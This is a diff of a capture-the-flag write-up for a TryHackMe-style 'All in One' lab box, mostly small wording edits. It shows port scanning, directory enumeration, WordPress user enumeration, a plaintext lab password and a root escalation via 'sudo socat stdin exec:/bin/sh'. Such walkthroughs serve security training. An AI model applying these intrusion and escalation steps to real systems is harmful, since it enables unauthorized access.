@@ -8,6 +8,12 @@ Try to discover and exploit them all. Do not just exploit it using intended path
 
 # Initial scan
 
+Let's start with an Nmap scan. The scan reveals three open ports:
+
+* 21 ftp
+* 22 ssh
+* 80 http
+
 ~~~
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
@@ -38,7 +44,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 # FTP
 
-The FTP service allows anonymous access but it contains nothing.
+The FTP service allows anonymous access but there's nothing to be found:
 
 ~~~
 ┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One]
@@ -65,7 +71,7 @@ ftp> exit
 
 ## Web Enumeration
 
-After finding nothing on the FTP service, I moved on to the web page. I started enumerating by running gobuster and found two interesting directories.
+After finding nothing on the FTP service, I moved on to the web page. I started enumerating by running gobuster and found two interesting directories:
 
 ~~~
 ┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One]
@@ -90,15 +96,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ## hackathones
 
-In this directory, there was a string and a possible key for it in the source code and the header is hinting us towards Vigenere encryption.
+In this directory, there was a string and a possible key for it in the source code and the header is hinting us towards Vigenere encryption:
 
 ~~~
 ┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One]
 └─$ curl http://10.10.142.56/hackathons              
 <html>
 <body>
-
-
 
 
 <h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>
@@ -119,7 +123,7 @@ I used [this site](https://www.dcode.fr/vigenere-cipher) to encrypt the string w
 
 ## wordpress
 
-This directory has the default wordpress theme, so I ran `wpscan` on it with `-e u` option to find users.
+This directory has the default wordpress theme, so I ran `wpscan` on it with `-e u` option to find users:
 
 ~~~
 ┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One]
@@ -290,7 +294,7 @@ user: elyana
 password: E@syR18ght
 ~~~
 
-Next I switched to elyana and read the user flag.
+Next I switched to user `elyana` and read the user flag:
 
 ~~~
 bash-4.4$ su elyana
@@ -323,7 +327,7 @@ User elyana may run the following commands on elyana:
 
 Great! I can run `socat` with sudo and no password. i searched for it in [GTFOBins](https://gtfobins.github.io/) and found a command that can gain me the root access.
 
-Just run `sudo socat stdin exec:/bin/sh` and B00M! We are root! just go to `/root` and there you can find the root flag. It is base64 encoded like the other one and after decoding it, we get the root flag.
+Just run `sudo socat stdin exec:/bin/sh` and B00M! We are root! just go to `/root` and there you can find the root flag. It is base64 encoded like the other one and after decoding it, we get the root flag:
 
 ~~~
 ┌──(user㉿Y0B01)-[~/Desktop/walkThroughs/thm/All_in_One/files]
